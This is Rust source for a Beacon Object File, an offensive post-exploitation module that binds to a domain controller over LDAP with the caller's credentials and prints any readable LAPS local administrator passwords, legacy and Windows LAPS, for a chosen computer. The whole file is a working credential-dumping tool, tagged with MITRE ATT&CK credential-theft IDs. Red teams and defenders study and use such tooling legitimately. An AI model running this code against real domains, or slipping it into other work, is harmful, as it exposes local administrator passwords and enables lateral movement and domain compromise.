//! # LAPS Dump BOF
//!
//! Queries one computer object for legacy Microsoft LAPS and Windows LAPS
//! attributes using the current security context. Encrypted Windows LAPS data
//! is reported as a bounded hexadecimal preview rather than decrypted.
//!
//! ## MITRE ATT&CK
//! - T1555.005 - Credentials from Password Stores: Password Managers
//! - T1087.002 - Account Discovery: Domain Account
//!
//! ## Arguments
//! - `str`: Computer name or DNS hostname.
//! - `str`: Domain controller hostname, empty for automatic discovery.

#![no_std]

use alloc::format;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};

const LDAP_PORT: u32 = 389;
const LDAP_SCOPE_BASE: u32 = 0;
const LDAP_SCOPE_SUBTREE: u32 = 2;
const LDAP_AUTH_NEGOTIATE: u32 = 0x0486;
const LDAP_OPT_REFERRALS: i32 = 0x08;
const LDAP_SUCCESS: u32 = 0;
const DS_RETURN_DNS_NAME: u32 = 0x40000000;
const MAX_VALUE_BYTES: usize = 64 * 1024;

#[repr(C)]
struct DomainControllerInfoA {
    dc_name: *mut u8,
    dc_address: *mut u8,
    dc_address_type: u32,
    domain_guid: [u8; 16],
    domain_name: *mut u8,
    dns_forest_name: *mut u8,
    flags: u32,
    dc_site_name: *mut u8,
    client_site_name: *mut u8,
}

#[repr(C)]
struct BerValue {
    length: u32,
    value: *mut u8,
}

unsafe extern "C" {
    fn ldap_initA(host: *const u8, port: u32) -> *mut core::ffi::c_void;
    fn ldap_set_optionA(
        ldap: *mut core::ffi::c_void,
        option: i32,
        value: *const core::ffi::c_void,
    ) -> u32;
    fn ldap_bind_sA(
        ldap: *mut core::ffi::c_void,
        distinguished_name: *const u8,
        credential: *const u8,
        method: u32,
    ) -> u32;
    fn ldap_search_sA(
        ldap: *mut core::ffi::c_void,
        base: *const u8,
        scope: u32,
        filter: *const u8,
        attributes: *const *const u8,
        attributes_only: u32,
        result: *mut *mut core::ffi::c_void,
    ) -> u32;
    fn ldap_first_entry(
        ldap: *mut core::ffi::c_void,
        result: *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    fn ldap_get_values_lenA(
        ldap: *mut core::ffi::c_void,
        entry: *mut core::ffi::c_void,
        attribute: *const u8,
    ) -> *mut *mut BerValue;
    fn ldap_value_free_len(values: *mut *mut BerValue) -> u32;
    fn ldap_msgfree(result: *mut core::ffi::c_void) -> u32;
    fn ldap_unbind(ldap: *mut core::ffi::c_void) -> u32;
}

unsafe extern "system" {
    fn DsGetDcNameA(
        computer: *const u8,
        domain: *const u8,
        guid: *mut core::ffi::c_void,
        site: *const u8,
        flags: u32,
        info: *mut *mut DomainControllerInfoA,
    ) -> u32;
    fn NetApiBufferFree(buffer: *const core::ffi::c_void) -> u32;
}

fn c_string(value: &str) -> Vec<u8> {
    let mut result = Vec::with_capacity(value.len() + 1);
    result.extend_from_slice(value.as_bytes());
    result.push(0);
    result
}

unsafe fn read_c_string(pointer: *const u8) -> String {
    if pointer.is_null() {
        return String::new();
    }
    let mut length = 0usize;
    unsafe {
        while *pointer.add(length) != 0 {
            length += 1;
        }
        String::from_utf8_lossy(core::slice::from_raw_parts(pointer, length)).into_owned()
    }
}

fn escape_filter(value: &str) -> String {
    let mut escaped = String::new();
    for byte in value.bytes() {
        match byte {
            b'\\' => escaped.push_str("\\5c"),
            b'*' => escaped.push_str("\\2a"),
            b'(' => escaped.push_str("\\28"),
            b')' => escaped.push_str("\\29"),
            0 => escaped.push_str("\\00"),
            _ => escaped.push(byte as char),
        }
    }
    escaped
}

fn printable(value: &[u8]) -> bool {
    !value.is_empty()
        && value
            .iter()
            .all(|byte| byte.is_ascii_graphic() || matches!(*byte, b' ' | b'\t' | b'\r' | b'\n'))
}

fn print_hex(name: &str, value: &[u8]) {
    let shown = value.len().min(64);
    let mut output = String::with_capacity(shown * 2);
    for byte in &value[..shown] {
        output.push_str(&format!("{:02x}", byte));
    }
    if shown < value.len() {
        println!("[+] {}: {}... ({} bytes)", name, output, value.len());
    } else {
        println!("[+] {}: {}", name, output);
    }
}

unsafe fn first_value(
    ldap: *mut core::ffi::c_void,
    entry: *mut core::ffi::c_void,
    attribute: &str,
) -> Option<Vec<u8>> {
    let name = c_string(attribute);
    let values = unsafe { ldap_get_values_lenA(ldap, entry, name.as_ptr()) };
    if values.is_null() {
        return None;
    }
    let first = unsafe { *values };
    let result = if first.is_null()
        || unsafe { (*first).value.is_null() }
        || unsafe { (*first).length as usize } > MAX_VALUE_BYTES
    {
        None
    } else {
        let length = unsafe { (*first).length as usize };
        let value = unsafe { core::slice::from_raw_parts((*first).value, length) };
        Some(value.to_vec())
    };
    unsafe { ldap_value_free_len(values) };
    result
}

unsafe fn naming_context(ldap: *mut core::ffi::c_void) -> Option<String> {
    let base = b"\0";
    let filter = b"(objectClass=*)\0";
    let attribute = b"defaultNamingContext\0";
    let attributes = [attribute.as_ptr(), core::ptr::null()];
    let mut result = core::ptr::null_mut();
    let status = unsafe {
        ldap_search_sA(
            ldap,
            base.as_ptr(),
            LDAP_SCOPE_BASE,
            filter.as_ptr(),
            attributes.as_ptr(),
            0,
            &mut result,
        )
    };
    if status != LDAP_SUCCESS || result.is_null() {
        return None;
    }
    let entry = unsafe { ldap_first_entry(ldap, result) };
    let value = if entry.is_null() {
        None
    } else {
        unsafe { first_value(ldap, entry, "defaultNamingContext") }
            .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
    };
    unsafe { ldap_msgfree(result) };
    value
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let computer = String::from(parser.get_str());
    let dc_argument = String::from(parser.get_str());
    if computer.is_empty() || computer.len() > 256 || dc_argument.len() > 256 {
        eprintln!("[-] A valid computer name is required.");
        return;
    }

    unsafe {
        let mut dc_info = core::ptr::null_mut();
        let dc = if dc_argument.is_empty() {
            let status = DsGetDcNameA(
                core::ptr::null(),
                core::ptr::null(),
                core::ptr::null_mut(),
                core::ptr::null(),
                DS_RETURN_DNS_NAME,
                &mut dc_info,
            );
            if status != 0 || dc_info.is_null() {
                eprintln!("[-] Domain controller discovery failed: {}", status);
                return;
            }
            read_c_string((*dc_info).dc_name)
                .trim_start_matches("\\\\")
                .to_string()
        } else {
            dc_argument
        };

        let dc_string = c_string(&dc);
        let ldap = ldap_initA(dc_string.as_ptr(), LDAP_PORT);
        if ldap.is_null() {
            eprintln!("[-] LDAP initialization failed.");
            if !dc_info.is_null() {
                NetApiBufferFree(dc_info.cast());
            }
            return;
        }
        let referrals = 0u32;
        ldap_set_optionA(ldap, LDAP_OPT_REFERRALS, (&referrals as *const u32).cast());
        let bind = ldap_bind_sA(
            ldap,
            core::ptr::null(),
            core::ptr::null(),
            LDAP_AUTH_NEGOTIATE,
        );
        if bind != LDAP_SUCCESS {
            eprintln!("[-] LDAP bind failed: {}", bind);
            ldap_unbind(ldap);
            if !dc_info.is_null() {
                NetApiBufferFree(dc_info.cast());
            }
            return;
        }

        let Some(base) = naming_context(ldap) else {
            eprintln!("[-] Could not read the default naming context.");
            ldap_unbind(ldap);
            if !dc_info.is_null() {
                NetApiBufferFree(dc_info.cast());
            }
            return;
        };
        let escaped = escape_filter(computer.trim_end_matches('$'));
        let filter = format!(
            "(&(objectCategory=computer)(|(name={0})(sAMAccountName={0}$)(dNSHostName={0})))",
            escaped
        );
        let attributes = [
            "sAMAccountName",
            "dNSHostName",
            "ms-Mcs-AdmPwd",
            "ms-Mcs-AdmPwdExpirationTime",
            "msLAPS-Password",
            "msLAPS-PasswordExpirationTime",
            "msLAPS-EncryptedPassword",
        ];
        let attribute_strings: Vec<Vec<u8>> =
            attributes.iter().map(|name| c_string(name)).collect();
        let mut attribute_pointers: Vec<*const u8> =
            attribute_strings.iter().map(|name| name.as_ptr()).collect();
        attribute_pointers.push(core::ptr::null());
        let base = c_string(&base);
        let filter = c_string(&filter);
        let mut result = core::ptr::null_mut();
        let search = ldap_search_sA(
            ldap,
            base.as_ptr(),
            LDAP_SCOPE_SUBTREE,
            filter.as_ptr(),
            attribute_pointers.as_ptr(),
            0,
            &mut result,
        );
        if search != LDAP_SUCCESS || result.is_null() {
            eprintln!("[-] LAPS query failed: {}", search);
        } else {
            let entry = ldap_first_entry(ldap, result);
            if entry.is_null() {
                println!("[-] Computer object not found or LAPS attributes are not readable.");
            } else {
                println!("[+] LAPS attributes for {}", computer);
                for attribute in attributes {
                    if let Some(value) = first_value(ldap, entry, attribute) {
                        if printable(&value) {
                            println!("[+] {}: {}", attribute, String::from_utf8_lossy(&value));
                        } else {
                            print_hex(attribute, &value);
                        }
                    }
                }
            }
            ldap_msgfree(result);
        }
        ldap_unbind(ldap);
        if !dc_info.is_null() {
            NetApiBufferFree(dc_info.cast());
        }
    }
}
